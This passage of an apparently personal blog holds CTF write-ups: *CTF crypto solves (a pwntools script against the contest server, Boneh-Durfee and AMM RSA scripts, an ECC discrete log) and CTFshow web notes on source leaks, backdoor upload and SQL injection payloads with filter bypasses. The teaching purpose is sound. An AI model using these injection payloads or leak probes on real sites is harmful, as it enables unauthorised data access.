;*CTF&#123;ÙMuG0t1T!&#125;*CTF&#123;ÙNuG0t1T!&#125;*CTF&#123;ÙOuG0t1T!&#125;*CTF&#123;éHuG0t1T!&#125;*CTF&#123;éIuG0t1T!&#125;*CTF&#123;éJuG0t1T!&#125;*CTF&#123;éKuG0t1T!&#125;*CTF&#123;éLuG0t1T!&#125;*CTF&#123;éMuG0t1T!&#125;*CTF&#123;éNuG0t1T!&#125;*CTF&#123;éOuG0t1T!&#125;*CTF&#123;ùHuG0t1T!&#125;*CTF&#123;ùIuG0t1T!&#125;*CTF&#123;ùJuG0t1T!&#125;*CTF&#123;ùKuG0t1T!&#125;*CTF&#123;ùLuG0t1T!&#125;*CTF&#123;ùMuG0t1T!&#125;*CTF&#123;ùNuG0t1T!&#125;*CTF&#123;ùOuG0t1T!&#125;还好小学读过英语, 根据语义猜测flag在*CTF&#123;YOuG0t1T!&#125;和*CTF&#123;yOuG0t1T!&#125;之中 猜猜是哪个呀 GuessKey2 关于出题人忘记把key注释掉多了一题GuessKey2那件事 nc 52.163.228.53 8080附件123456789101112131415161718192021222324252627282930313233343536373839404142434445464748from random import randintimport osfrom flag import flagN=64key=randint(0,2**N)print keykey=bin(key)[2:].rjust(N,&#x27;0&#x27;)count=0while True: p=0 q=0 new_key=&#x27;&#x27; zeros=[0] for j in range(len(key)): if key[j]==&#x27;0&#x27;: zeros.append(j) p=zeros[randint(0,len(zeros))-1] q=zeros[randint(0,len(zeros))-1] try: mask=int(raw_input(&quot;mask:&quot;)) except: exit(0) mask=bin(mask)[2:] if p&gt;q: tmp=q q=p p=tmp cnt=0 for j in range(0,N): if j in range(p,q+1): new_key+=str(int(mask[cnt])^int(key[j])) else: new_key+=key[j] cnt+=1 cnt%=len(mask) key=new_key try: guess=int(raw_input(&quot;guess:&quot;)) except: exit(0) if guess==int(key,2): count+=1 print &#x27;Nice.&#x27; else: count=0 print &#x27;Oops.&#x27; if count&gt;2: print flag随机生成一个key, 输入mask, 每一轮都会随机的在key中取一段(开头结尾两位必定都是0), 然后与mask对应的一段异或(mask先重复填充成key长度). 题目让我们猜每一轮的key, 连续猜中3轮就能得到flag 可以看到只有输入mask才能改变key, 想到key中拿来跟mask异或的第一位必定是0, 如果最前面的0被改成了1, 那么它前面的位数和它本身就再也不会改变了, 利用这个特点, 可以疯狂传mask=1,让key的所有位数变成1, 当key变成全1之后, 传mask=0就能保持key不变了, 一直传guess=int(&#39;1&#39;*64,2)就行了12345678910111213141516171819202122232425262728293031from random import randintfrom pwn import *mask = &#x27;1&#x27;key = &#x27;1&#x27;*64mask = str(int(mask,2))key = str(int(key,2))print(mask)print(key)con = remote(&#x27;52.163.228.53&#x27;, 8082)resp = con.recv().decode()print(resp)i = 0while True: con.sendline(mask.encode()) resp = con.recv().decode() con.sendline(key.encode()) resp = con.recvuntil(&#x27;mask:&#x27;).decode() print(resp) if &#x27;e&#x27; in resp: for _ in range(3): con.sendline(&#x27;0&#x27;.encode()) resp = con.recv().decode() con.sendline(key.encode()) resp = con.recvuntil(&#x27;mask:&#x27;).decode() print(resp) break i += 1 print(i)大概跑个一两百轮?就能出结果了1*CTF&#123;27d30dad45523cbf88013674a4b5bd29&#125; little case 总会有一道RSA的对吧? 附件:1234567891011121314151617181920212223242526272829303132333435363738from Crypto.Util.number import *from libnum import *from secret import flag,special,p,q,ndef little_trick(msg): p1 = getPrime(1024) q1 = getPrime(1024) n1 = p1 * q1 d1=random.randint(1,2**256) e1=inverse(d1,(p1-1)*(q1-1)) print(n1) print(e1) print(pow(msg,e1,n1))def real_trick(): assert (special &gt; (ord(&quot;*&quot;)*100) and gcd(special,(p-1)*(q-1))!=1 ) print(n) print(pow(libnum.s2n(flag),special,n))if __name__ == &#x27;__main__&#x27;: little_trick(p-1) real_trick()&#x27;&#x27;&#x27;输出2166969987538734397576548483417596246134883737144702469545847915461534869733094456671458721785288870229136830663797709549095319270145012779867042595976811838491508201737395131569989900963183447169181181539378474893088095411444674581405813275289782771707788654791147657575125487262392778367025296999507562925554162191776750126124919265354687510453264904321969761646420577202526701932836434976385465949014453108734997446907925523682309641509455203748827775292757990953940131162467144483333261817751335617353757328035272438437637295510003153423681668180539660814764700365362820325868109755204911430836796796718411683956120717541468269984768938524534679430706714860712589983300712432366828367981392533792814384884126053081363266457682162675931547901815985830455612301105504518353600255693451085179954519939635263372257973143178677586338992274607959326361412487748088349413448526455377296931144384663805056580662706419414607407821761761574754611275621927387380065975844282519447660467416826579669726178901884060454994606177784839804528666823956703141147239309978420776148158425922031573513062568162012505209805669623841355103885621402814626329355281853436655713194649170570579414480803671531927080535374958180810697826214794117466378050607176539138222652920461404360773520273885180129341784970598507030048392686221756661237287565905053442793955466822625315468413910881083476950910279105441128302707221794807868597032254219726690214064954521070071544267307987529121635533324469290490574646122678700124382684589146521293911502179320769468863012941550317042792225948425851236718711188795749464241383917033088697531544976656307993001386513048352057551779401166808211428589238421242945296407196294978535989149630746563193256642101047882019579458019902966045857218200463914392352869510880869662530389895867373524679054011076137634873020705462472824066644317774752234608703633137996819211838940304756844580541488194897851858027702702748628429341509762301122850696807175370925635224673318130451371300309661526661336508090976060549801733008596069960777736142956237612437634021542639879792016801613783056356463692225721506626607549462578294397385749078191669411818709478603479243778196460108984354999593988793941076335033865890110802065847595648939130052869128960414959872080301237176577092821104475562604581705387080304086372245855492407601115169556714797690305399391485971463183775543559200698659800620769259901902664475357585338281026191033219744738672741960607394864523837759571912732299056226934743176360461051108799706450051853623472248552066649321279227693844417404789169416642586313895494292082308084823101092675162498154181999270703392144766031531668783213589136974486867571090321426005719333327425286160436925591205840653712046866950957876967715226097699016798471712274797888761218915345301238306497841970203137048433491914195023230951832644259526895087301990301002618450573323078919808182376666320244077837033894089805640452791930176084416087344594957596135877833163152566525019063919662459299054294655118065279192807949989681674190983739625056255497842063989284921411358232926435537518406&#x27;&#x27;&#x27;一共两个问题吧 根据n1,e1以及pow(p-1,e1,n1)求p-1 根据上面的p, n 还有一些e有关的条件, 求flag 根据n1,e1以及pow(p-1,e1,n1)求p-1e1够大, 直接上Boneh_Durfee, 直接拿github上面的脚本跑了(不想改了….123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331import time############################################# Config##########################################&quot;&quot;&quot;Setting debug to true will display more informationsabout the lattice, the bounds, the vectors...&quot;&quot;&quot;debug = False&quot;&quot;&quot;Setting strict to true will stop the algorithm (andreturn (-1, -1)) if we don&#x27;t have a correct upperbound on the determinant. Note that this doesn&#x27;t necesseraly mean that no solutions will be found since the theoretical upperbound isusualy far away from actual results. That is whyyou should probably use `strict = False`&quot;&quot;&quot;strict = False&quot;&quot;&quot;This is experimental, but has provided remarkable resultsso far. It tries to reduce the lattice as much as it canwhile keeping its efficiency. I see no reason not to usethis option, but if things don&#x27;t work, you should trydisabling it&quot;&quot;&quot;helpful_only = Truedimension_min = 7 # stop removing if lattice reaches that dimension############################################# Functions########################################### display stats on helpful vectorsdef helpful_vectors(BB, modulus): nothelpful = 0 for ii in range(BB.dimensions()[0]): if BB[ii,ii] &gt;= modulus: nothelpful += 1 print (nothelpful, &quot;/&quot;, BB.dimensions()[0], &quot; vectors are not helpful&quot;)# display matrix picture with 0 and Xdef matrix_overview(BB, bound): for ii in range(BB.dimensions()[0]): a = (&#x27;%02d &#x27; % ii) for jj in range(BB.dimensions()[1]): a += &#x27;0&#x27; if BB[ii,jj] == 0 else &#x27;X&#x27; if BB.dimensions()[0] &lt; 60: a += &#x27; &#x27; if BB[ii, ii] &gt;= bound: a += &#x27;~&#x27; print (a)# tries to remove unhelpful vectors# we start at current = n-1 (last vector)def remove_unhelpful(BB, monomials, bound, current): # end of our recursive function if current == -1 or BB.dimensions()[0] &lt;= dimension_min: return BB # we start by checking from the end for ii in range(current, -1, -1): # if it is unhelpful: if BB[ii, ii] &gt;= bound: affected_vectors = 0 affected_vector_index = 0 # let&#x27;s check if it affects other vectors for jj in range(ii + 1, BB.dimensions()[0]): # if another vector is affected: # we increase the count if BB[jj, ii] != 0: affected_vectors += 1 affected_vector_index = jj # level:0 # if no other vectors end up affected # we remove it if affected_vectors == 0: print (&quot;* removing unhelpful vector&quot;, ii) BB = BB.delete_columns([ii]) BB = BB.delete_rows([ii]) monomials.pop(ii) BB = remove_unhelpful(BB, monomials, bound, ii-1) return BB # level:1 # if just one was affected we check # if it is affecting someone else elif affected_vectors == 1: affected_deeper = True for kk in range(affected_vector_index + 1, BB.dimensions()[0]): # if it is affecting even one vector # we give up on this one if BB[kk, affected_vector_index] != 0: affected_deeper = False # remove both it if no other vector was affected and # this helpful vector is not helpful enough # compared to our unhelpful one if affected_deeper and abs(bound - BB[affected_vector_index, affected_vector_index]) &lt; abs(bound - BB[ii, ii]): print (&quot;* removing unhelpful vectors&quot;, ii, &quot;and&quot;, affected_vector_index) BB = BB.delete_columns([affected_vector_index, ii]) BB = BB.delete_rows([affected_vector_index, ii]) monomials.pop(affected_vector_index) monomials.pop(ii) BB = remove_unhelpful(BB, monomials, bound, ii-1) return BB # nothing happened return BB&quot;&quot;&quot; Returns:* 0,0 if it fails* -1,-1 if `strict=true`, and determinant doesn&#x27;t bound* x0,y0 the solutions of `pol`&quot;&quot;&quot;def boneh_durfee(pol, modulus, mm, tt, XX, YY): &quot;&quot;&quot; Boneh and Durfee revisited by Herrmann and May finds a solution if: * d &lt; N^delta * |x| &lt; e^delta * |y| &lt; e^0.5 whenever delta &lt; 1 - sqrt(2)/2 ~ 0.292 &quot;&quot;&quot; # substitution (Herrman and May) PR.&lt;u, x, y&gt; = PolynomialRing(ZZ) Q = PR.quotient(x*y + 1 - u) # u = xy + 1 polZ = Q(pol).lift() UU = XX*YY + 1 # x-shifts gg = [] for kk in range(mm + 1): for ii in range(mm - kk + 1): xshift = x^ii * modulus^(mm - kk) * polZ(u, x, y)^kk gg.append(xshift) gg.sort() # x-shifts list of monomials monomials = [] for polynomial in gg: for monomial in polynomial.monomials(): if monomial not in monomials: monomials.append(monomial) monomials.sort() # y-shifts (selected by Herrman and May) for jj in range(1, tt + 1): for kk in range(floor(mm/tt) * jj, mm + 1): yshift = y^jj * polZ(u, x, y)^kk * modulus^(mm - kk) yshift = Q(yshift).lift() gg.append(yshift) # substitution # y-shifts list of monomials for jj in range(1, tt + 1): for kk in range(floor(mm/tt) * jj, mm + 1): monomials.append(u^kk * y^jj) # construct lattice B nn = len(monomials) BB = Matrix(ZZ, nn) for ii in range(nn): BB[ii, 0] = gg[ii](0, 0, 0) for jj in range(1, ii + 1): if monomials[jj] in gg[ii].monomials(): BB[ii, jj] = gg[ii].monomial_coefficient(monomials[jj]) * monomials[jj](UU,XX,YY) # Prototype to reduce the lattice if helpful_only: # automatically remove BB = remove_unhelpful(BB, monomials, modulus^mm, nn-1) # reset dimension nn = BB.dimensions()[0] if nn == 0: print (&quot;failure&quot;) return 0,0 # check if vectors are helpful if debug: helpful_vectors(BB, modulus^mm) # check if determinant is correctly bounded det = BB.det() bound = modulus^(mm*nn) if det &gt;= bound: print (&quot;We do not have det &lt; bound. Solutions might not be found.&quot;) print (&quot;Try with highers m and t.&quot;) if debug: diff = (log(det) - log(bound)) / log(2) print (&quot;size det(L) - size e^(m*n) = &quot;, floor(diff)) if strict: return -1, -1 else: print (&quot;det(L) &lt; e^(m*n) (good! If a solution exists &lt; N^delta, it will be found)&quot;) # display the lattice basis if debug: matrix_overview(BB, modulus^mm) # LLL if debug: print (&quot;optimizing basis of the lattice via LLL, this can take a long time&quot;) BB = BB.LLL() if debug: print (&quot;LLL is done!&quot;) # transform vector i &amp; j -&gt; polynomials 1 &amp; 2 if debug: print (&quot;looking for independent vectors in the lattice&quot;) found_polynomials = False for pol1_idx in range(nn - 1): for pol2_idx in range(pol1_idx + 1, nn): # for i and j, create the two polynomials PR.&lt;w,z&gt; = PolynomialRing(ZZ) pol1 = pol2 = 0 for jj in range(nn): pol1 += monomials[jj](w*z+1,w,z) * BB[pol1_idx, jj] / monomials[jj](UU,XX,YY) pol2 += monomials[jj](w*z+1,w,z) * BB[pol2_idx, jj] / monomials[jj](UU,XX,YY) # resultant PR.&lt;q&gt; = PolynomialRing(ZZ) rr = pol1.resultant(pol2) # are these good polynomials? if rr.is_zero() or rr.monomials() == [1]: continue else: print (&quot;found them, using vectors&quot;, pol1_idx, &quot;and&quot;, pol2_idx) found_polynomials = True break if found_polynomials: break if not found_polynomials: print( &quot;no independant vectors could be found. This should very rarely happen...&quot;) return 0, 0 rr = rr(q, q) # solutions soly = rr.roots() if len(soly) == 0: print (&quot;Your prediction (delta) is too small&quot;) return 0, 0 soly = soly[0][0] ss = pol1(q, soly) solx = ss.roots()[0][0] # return solx, solydef example(): N = 21669699875387343975765484834175962461348837371447024695458479154615348697330944566714587217852888702291368306637977095490953192701450127798670425959768118384915082017373951315699899009631834471691811815393784748930880954114446745814058132752897827717077886547911476575751254872623927783670252969995075629255541621917767501261249192653546875104532649043219697616464205772025267019328364349763854659490144531087349974469079255236823096415094552037488277752927579909539401311624671444833332618177513356173537573280352724384376372955100031534236816681805396608147647003653628203258681097552049114308367967967184116839561 # the public exponent e = 20717541468269984768938524534679430706714860712589983300712432366828367981392533792814384884126053081363266457682162675931547901815985830455612301105504518353600255693451085179954519939635263372257973143178677586338992274607959326361412487748088349413448526455377296931144384663805056580662706419414607407821761761574754611275621927387380065975844282519447660467416826579669726178901884060454994606177784839804528666823956703141147239309978420776148158425922031573513062568162012505209805669623841355103885621402814626329355281853436655713194649170570579414480803671531927080535374958180810697826214794117466378050607 # the hypothesis on the private exponent (the theoretical maximum is 0.292) delta = .29 # this means that d &lt; N^delta # # Lattice (tweak those values) # # you should tweak this (after a first run), (e.g. increment it until a solution is found) for m in range(1,20):# m = 4 # size of the lattice (bigger the better/slower) # you need to be a lattice master to tweak these t = int((1-2*delta) * m) # optimization from Herrmann and May X = 2*floor(N^delta) # this _might_ be too much Y = floor(N^(1/2)) # correct if p, q are ~ same size # # Don&#x27;t touch anything below # # Problem put in equation P.&lt;x,y&gt; = PolynomialRing(ZZ) A = int((N+1)/2) pol = 1 + x * (A + y) # # Find the solutions! # # Checking bounds if debug: print (&quot;=== checking values ===&quot;) print (&quot;* delta:&quot;, delta) print (&quot;* delta &lt; 0.292&quot;, delta &lt; 0.292) print (&quot;* size of e:&quot;, int(log(e)/log(2))) print (&quot;* size of N:&quot;, int(log(N)/log(2))) print (&quot;* m:&quot;, m, &quot;, t:&quot;, t) # boneh_durfee if debug: print (&quot;=== running algorithm ===&quot;) start_time = time.time() solx, soly = boneh_durfee(pol, e, m, t, X, Y) # found a solution? if solx &gt; 0: print (&quot;=== solution found ===&quot;) if False: print (&quot;x:&quot;, solx) print (&quot;y:&quot;, soly) d = int(pol(solx, soly) / e) print (&quot;private key found:&quot;, d) else: print (&quot;=== no solution was found ===&quot;) if debug: print(&quot;=== %s seconds ===&quot; % (time.time() - start_time))if __name__ == &quot;__main__&quot;: example()跑出d1 =36167461773898995192586226632578677184913220227461899855497899052924496298787 解rsa , 有p = 199138677823743837339927520157607820029746574557746549094921488292877226509198315016018919385259781238148402833316033634968163276198999279327827901879426429664674358844084491830543271625147280950273934405879341438429171453002453838897458102128836690385604150324972907981960626767679153125735677417397078196059 根据上面的p, n 还有一些e有关的条件, 求flag通过p,n得到1234c = 12732299056226934743176360461051108799706450051853623472248552066649321279227693844417404789169416642586313895494292082308084823101092675162498154181999270703392144766031531668783213589136974486867571090321426005719333327425286160436925591205840653712046866950957876967715226097699016798471712274797888761218915345301238306497841970203137048433491914195023230951832644259526895087301990301002618450573323078919808182376666320244077837033894089805640452791930176084416087344594957596135877833163152566525019063919662459299054294655118065279192807949989681674190983739625056255497842063989284921411358232926435537518406p = 199138677823743837339927520157607820029746574557746549094921488292877226509198315016018919385259781238148402833316033634968163276198999279327827901879426429664674358844084491830543271625147280950273934405879341438429171453002453838897458102128836690385604150324972907981960626767679153125735677417397078196059q = 112213695905472142415221444515326532320352429478341683352811183503269676555434601229013679319423878238944956830244386653674413411658696751173844443394608246716053086226910581400528167848306119179879115809778793093611381764939789057524575349501163689452810148280625226541609383166347879832134495444706697124741e=这里有个e是未知的, 但是assert (e &gt; (ord(&quot;*&quot;)*100) and gcd(e,(p-1)*(q-1))!=1 )可以看到e&gt;4200而且e与phi不是互素的… 马上想到AMM了, 但是这个e不知道试试从4200开始爆破e….结果AMM实在是跑的太久了(也不知道为啥根本没办法往下爆… 想回去看看之前找到AMM的那个博客, 想自己重新写一个来着……http://yulige.top/?p=752#Sore667pt_6solvers - easyRSA然后…就发现 怎么博客那道题的p和q和这道题的一模一样啊!会不会e也没改?于是试了一下原题的e = 0x1337, 然后把慢到打把游戏都跑不完的组合ART改成直接遍历mod p下的0x1337次方根(只有flag够短才能成功, 事实上做出答案了发现出题人是有做padding的, 但是似乎还是太短了? 然后就直接跑出来了….12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394import randomimport time# About 3 seconds to rundef AMM(o, r, q): start = time.time() print(&#x27;\\n----------------------------------------------------------------------------------&#x27;) print(&#x27;Start to run Adleman-Manders-Miller Root Extraction Method&#x27;) print(&#x27;Try to find one &#123;:#x&#125;th root of &#123;&#125; modulo &#123;&#125;&#x27;.format(r, o, q)) g = GF(q) o = g(o) p = g(random.randint(1, q)) while p ^ ((q-1) // r) == 1: p = g(random.randint(1, q)) print(&#x27;[+] Find p:&#123;&#125;&#x27;.format(p)) t = 0 s = q - 1 while s % r == 0: t += 1 s = s // r print(&#x27;[+] Find s:&#123;&#125;, t:&#123;&#125;&#x27;.format(s, t)) k = 1 while (k * s + 1) % r != 0: k += 1 alp = (k * s + 1) // r print(&#x27;[+] Find alp:&#123;&#125;&#x27;.format(alp)) a = p ^ (r**(t-1) * s) b = o ^ (r*alp - 1) c = p ^ s h = 1 for i in range(1, t): d = b ^ (r^(t-1-i)) if d == 1: j = 0 else: print(&#x27;[+] Calculating DLP...&#x27;) j = - dicreat_log(a, d) print(&#x27;[+] Finish DLP...&#x27;) b = b * (c^r)^j h = h * c^j c = c ^ r result = o^alp * h end = time.time() print(&quot;Finished in &#123;&#125; seconds.&quot;.format(end - start)) print(&#x27;Find one solution: &#123;&#125;&#x27;.format(result)) return resultdef findAllPRoot(p, e): print(&quot;Start to find all the Primitive &#123;:#x&#125;th root of 1 modulo &#123;&#125;.&quot;.format(e, p)) start = time.time() proot = set() while len(proot) &lt; e: proot.add(pow(random.randint(2, p-1), (p-1)//e, p)) end = time.time() print(&quot;Finished in &#123;&#125; seconds.&quot;.format(end - start)) return prootdef findAllSolutions(mp, proot, cp, p): print(&quot;Start to find all the &#123;:#x&#125;th root of &#123;&#125; modulo &#123;&#125;.&quot;.format(e, cp, p)) start = time.time() all_mp = set() for root in proot: mp2 = mp * root % p assert(pow(mp2, e, p) == cp) all_mp.add(mp2) end = time.time() print(&quot;Finished in &#123;&#125; seconds.&quot;.format(end - start)) return all_mpfrom Crypto.Util.number import long_to_bytesc = 12732299056226934743176360461051108799706450051853623472248552066649321279227693844417404789169416642586313895494292082308084823101092675162498154181999270703392144766031531668783213589136974486867571090321426005719333327425286160436925591205840653712046866950957876967715226097699016798471712274797888761218915345301238306497841970203137048433491914195023230951832644259526895087301990301002618450573323078919808182376666320244077837033894089805640452791930176084416087344594957596135877833163152566525019063919662459299054294655118065279192807949989681674190983739625056255497842063989284921411358232926435537518406p = 199138677823743837339927520157607820029746574557746549094921488292877226509198315016018919385259781238148402833316033634968163276198999279327827901879426429664674358844084491830543271625147280950273934405879341438429171453002453838897458102128836690385604150324972907981960626767679153125735677417397078196059q = 112213695905472142415221444515326532320352429478341683352811183503269676555434601229013679319423878238944956830244386653674413411658696751173844443394608246716053086226910581400528167848306119179879115809778793093611381764939789057524575349501163689452810148280625226541609383166347879832134495444706697124741e = 0x1337cp = c % pmp = AMM(cp, e, p)p_proot = findAllPRoot(p, e)mps = findAllSolutions(mp, p_proot, cp, p)def check(m): if long_to_bytes(m).decode(&#x27;utf-8&#x27;,&#x27;ignore&#x27;).startswith(&#x27;*CTF&#x27;): print(long_to_bytes(m)) exit() return True elif long_to_bytes(m).decode(&#x27;utf-8&#x27;,&#x27;ignore&#x27;).startswith(&#x27;*ctf&#x27;): print(long_to_bytes(m)) exit() return True else: return Falsefor mpp in mps: check(int(mpp))输出1b&#39;*CTF&#123;S0_Y0u_ARE_REA11Y_GOOd_At_Pla1_This&#125;Ifyoumissthetrainimonyouwillknowthatiamgoneyoucanheartheflagfluwwwwwwwwww&#39; 看这个flag好像又是歪打正着的一题….Pla1估计是某个方法吧?等个官方wp咯还好padding长度不够hhhh, 不过要是长度够跑那个组合ART应该也是可以出结果的, 就是要多打两把游戏而已顺便一提, 这个padding是歌词吧! 500 miles好听! MyCurve附件12345678910111213141516171819202122232425262728293031323334from Crypto.Util.number import bytes_to_longfrom flag import flagassert flag[:5]==&#x27;*CTF&#123;&#x27; and flag[-1]==&#x27;&#125;&#x27;flag=flag[5:-1]def add(P,Q): if Q==0: return P x1,y1=P x2,y2=Q return (d1*(x1+x2)+d2*(x1+y1)*(x2+y2)+(x1+x1^2)*(x2*(y1+y2+1)+y1*y2))/(d1+(x1+x1^2)*(x2+y2)),(d1*(y1+y2)+d2*(x1+y1)*(x2+y2)+(y1+y1^2)*(y2*(x1+x2+1)+x1*x2))/(d1+(y1+y1^2)*(x2+y2))def mul(k,P): Q=(0,0) while k&gt;0: if is_even(k): k/=2 P=add(P,P) else: k-=1 Q=add(P,Q) return QF=GF(2**100)R.&lt;x,y&gt;=F[]d1=F.fetch_int(1)d2=F.fetch_int(1)x,y=(698546134536218110797266045394L, 1234575357354908313123830206394L)G=(F.fetch_int(x),F.fetch_int(y))P=mul(bytes_to_long(flag),G)print (G[0].integer_representation(),G[1].integer_representation())print (P[0].integer_representation(),P[1].integer_representation())#(698546134536218110797266045394L, 1234575357354908313123830206394L)#(403494114976379491717836688842L, 915160228101530700618267188624L)椭圆曲线… 第一次做这样的比赛的时候也没做出来 查了查https://www.hyperelliptic.org (应该是一个曲线库发现里面有一种曲线就是题目给的曲线就是这个具体是啥玩意还搞不懂 只能先按着库里面的数据把脚本写好 学完ECC再来看看了1234567891011121314from Crypto.Util.number import long_to_bytesF=GF(2**100)R.&lt;x,y&gt;=F[]def _map(p): x,y = F.fetch_int(p[0]),F.fetch_int(p[1]) u = 3*(x+y)/(x*y+x+y) v = 3*(x/(x*y+x+y)+2) return (u,v)G = (698546134536218110797266045394,1234575357354908313123830206394)P = (403494114976379491717836688842,915160228101530700618267188624)E = EllipticCurve(GF(2**100),[1, 2, 0, 0, 3])base = E(_map(G))res = E(_map(P))flag = discrete_log(res,base,base.order(),operation=&quot;+&quot;)print(long_to_bytes(flag))","tags":[{"name":"Crypto","slug":"Crypto","permalink":"http://tearsjin.github.io/tags/Crypto/"},{"name":"RSA","slug":"RSA","permalink":"http://tearsjin.github.io/tags/RSA/"},{"name":"WriteUp","slug":"WriteUp","permalink":"http://tearsjin.github.io/tags/WriteUp/"},{"name":"ECC","slug":"ECC","permalink":"http://tearsjin.github.io/tags/ECC/"},{"name":"lfsr","slug":"lfsr","permalink":"http://tearsjin.github.io/tags/lfsr/"}]},{"title":"","date":"2020-12-12T10:31:38.000Z","path":"2020/12/12/CTFshow-Web1000/","text":"重金买了个号怎么可能不做呢???好好学学Web了 真的很重要! 信息搜集 Web1~20Web 1F12 Web 2没办法F12和右键了, 直接firefox开发者工具 Web 3抓包, flag就在响应里 所以有时候没思路就抓抓包, 有可能有线索或者提示的 Web 4robots.txt 所以没思路的时候就阿巴阿巴 Web 5phps源码泄露 有时候试试phps读源码, 有惊喜哦 Web 6也是源码泄露, 应该是备份压缩包常见的名字有 1234567'www.zip','www.bak','www.rar','www.7z','www.tar','www.tar.gz','www.txt' Web 7git泄露漏洞成因：在运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，把.git这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。 一般来说就是.git泄露之后恢复源码什么的. 有时候还会需要用.git/config 中含有的access_token信息, 从而访问这个用户的其他仓库 有些时候访问.git会返回403, 这个时候就要试探的访问.git/config, 如果有内容返回, 就说明存在git泄露. 关于敏感目录泄露, 还有SVN泄露, HG泄露等等… 等以后遇到了再来总结 Web 8SVN 泄露SVN(subversion)是一个源代码版本管理软件. 同样的隐藏文件.SVN里面会有信息. 利用seay-svn获取服务器源码等信息 Web 9vim备份文件泄露当用户在用vim编辑文件但意外退出时, 会在当前目录下生成一个备份文件, 文件名格式为.文件名.swp 针对swp备份文件, 可以用vim -r命令恢复文件的内容. Web 10Cookies里面有内容 抓包分析的时候一般都会看看Cookies的 Web 11域名解析http://dbcha.com/ 里面查ctfshow.com的txt记录 顺便学习一下域名解析的类型 域名解析类型: A/CNAME/MX/NS/TXT/AAAA/SRV/显性URL/隐性URLA记录：将域名指向一个IPv4地址（例如：10.10.10.10），需要增加A记录CNAME记录：如果将域名指向一个域名，实现与被指向域名相同的访问效果，需要增加CNAME记录MX记录：建立电子邮箱服务，将指向邮件服务器地址，需要设置MX记录NS记录：域名解析服务器记录，如果要将子域名指定某个域名服务器来解析，需要设置NS记录TXT记录：可任意填写（可为空），通常用做SPF记录（反垃圾邮件）使用AAAA记录：将主机名（或域名）指向一个IPv6地址（例如：ff03:0:0:0:0:0:0:c1），需要添加AAAA记录SRV记录：记录了哪台计算机提供了哪个服务。格式为：服务的名字.协议的类型（例如：_example-server._tcp）显性URL：将域名指向一个http(s)协议地址，访问域名时，自动跳转至目标地址（例如：将www.net.cn显性转发到www.hichina.com后，访问www.net.cn时，地址栏显示的地址为：www.hichina.com）。隐性URL：与显性URL类似，但隐性转发会隐藏真实的目标地址（例如：将www.net.cn隐性转发到www.hichina.com后，访问www.net.cn时，地址栏显示的地址仍然为：www.net.cn）。 Web 12 开始变得奇怪了 进去是一个购物网站, 抓包无果, 看了下robots.txt, 有提示/admin/要输入账号密码, 账号就是admin, 密码是网站下面的那串数字 正常情况下没有人会这么干吧!所以还是要多去看看一下可以搜集信息的地方, robotx.txt啥的 Web 13拿到一个网站可以看看看看有哪些链接是可以跳转的(哪些是可以点击的)网站下面有个document可以点, 进去以后里面有后台的地址和用户名密码. Web 14 KindEditor PHP编辑器最新版默认配置下，如果目录不存在，则会遍历服务器根目录 进入/editor/(这个得目录扫描吧… 利用上传图片遍历服务器根目录, 在网站目录下找到/nothinghere/fl000g.txt Web 15目录下有admin/忘记密码需要填写密保而网站下方有qq邮箱, 搜索qq可以知道密保答案 Web 16考察PHP探针php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡 流量、系统负载、服务器时间等信息。 url后缀名添加/tz.php 版本是雅黑PHP探针. Web 17利用ping 直接获得某个域名所对应的ip Web 18js代码审计, 找到游戏结果的判断就能找到线索 Web 19AES加密, 但是Key iv mode padmode都在前端….利用http://tool.chacuo.net/cryptaes解密即可 文件上传 web151 ~ web170前端验证上传文件后缀名, 只需要抓包改一下文件名称就能上传后门了 通过ls找到flag.php , cat flag.php即可 sql注入 web171~ web253web 171语句: 1$sql = \"select username,password from user where username !='flag' and id = '\".$_GET['id'].\"' limit 1;\"; 直接在本表内爆出所有数据即可, payload: id= 1' or 1 --+ web 172语句$sql = \"select username,password from ctfshow_user2 where username !='flag' and id = '\".$_GET['id'].\"' limit 1;\"; 但是输出经过了过滤: 1234//检查结果是否有flag if($row-&gt;username!=='flag'){ $ret['msg']='查询成功'; } 所以需要把返回出来的username改掉, 让他检查不出来, payload: 1' union select 1,password from ctfshow_user2 where username = 'flag' --+ web 173语句:$sql = \"select id,username,password from ctfshow_user3 where username !='flag' and id = '\".$_GET['id'].\"' limit 1;\"; 返回逻辑 12345//检查结果是否有flag if(!preg_match('/flag/i', json_encode($ret))){ $ret['msg']='查询成功'; } 这里直接对结果进行过滤, 需要让返回的结果不存在flag, 考虑将返回的结果全部转成十六进制 payload: 0' union select 1,hex(username),hex(password) from ctfshow_user3 where username = 'flag' --+ 然后将返回的结果转成text即可, 但是出来flag的时候发现, 其实根本不需要转成16进制, 因为flag里根本就没有flag字样(ctfshow{3354c0bf-e7ab-4e26-9990-b5679766170d}), 所以直接0' union select 1,2,password from ctfshow_user3 where username = 'flag' --+ 也能出结果 web 174语句: $sql = \"select username,password from ctfshow_user4 where username !='flag' and id = '\".$_GET['id'].\"' limit 1;\"; 返回逻辑 12345//检查结果是否有flag if(!preg_match('/flag|[0-9]/i', json_encode($ret))){ $ret['msg']='查询成功'; } 这下好了, 结果里连数字都不能出现了, hex(), base64()估计都不能用了, 想个办法把数字转成别的字符, replace(str1,str2,str3) 可以把str1中的str2替换成str3, 可以考虑用这个将所有数字换成大写字母(毕竟flag中是没有大写字母的, 没有找到sql用正则的方法, 只能把多个replace()套在一起了 payload:0' union select 'a',replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,'1','A'),'2','B'),'3','C'),'4','D'),'5','E'),'6','F'),'7','G'),'8','H'),'9','I'),'0','J') from ctfshow_user4 where username = 'flag' --+ 然后将返回的结果中的大写字母转回数字就行了 web 175语句:$sql = \"select username,password from 